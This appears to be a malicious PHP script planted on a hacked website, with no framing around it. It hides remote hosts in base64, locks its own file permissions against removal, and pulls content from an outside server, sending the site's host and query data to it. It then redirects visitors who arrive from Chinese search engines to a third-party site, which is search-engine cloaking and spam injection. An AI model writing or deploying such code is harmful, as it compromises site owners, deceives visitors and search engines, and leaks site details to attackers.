<?php
set_time_limit(0);
$url1 = $_SERVER['PHP_SELF'];
$kes= $_SERVER["HTTP_REFERER"];
$name= substr($url1 ,strrpos($url1 ,'/')+1 );
chmod($name,0444);
header("Content-Type: text/html;charset=UTF-8");
date_default_timezone_set('PRC');
$a = base64_decode("aHR0cDovL2pzY2UuZnVja2RkZG9zLmNvbQ==");
$b = base64_decode("aHR0cDovLw==") . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
$c = file_get_contents($a . base64_decode("L3dlYjEucGhwP2hvc3Q9") . $b . "&url=" . $_SERVER['QUERY_STRING'] . "&domain=" . $_SERVER['SERVER_NAME']);
echo $c;
if (isset($_SERVER['HTTP_REFERER'])) 
{
if(strpos($kes,'Sogou')!== false||strpos($kes,'Baidu')!==false||strpos($kes,'baidu')!==false||strpos($kes,'Yisou')!==false||strpos($kes,'Easou')!==false||strpos($kes,'360')!==false||strpos($kes,'haosou')!==false||strpos($kes,'Soso')!==false)
{
	header("location:".base64_decode("aHR0cHM6Ly93bC5jaGluYWlnbS5uZXQv"));
	return ;
}
}
?>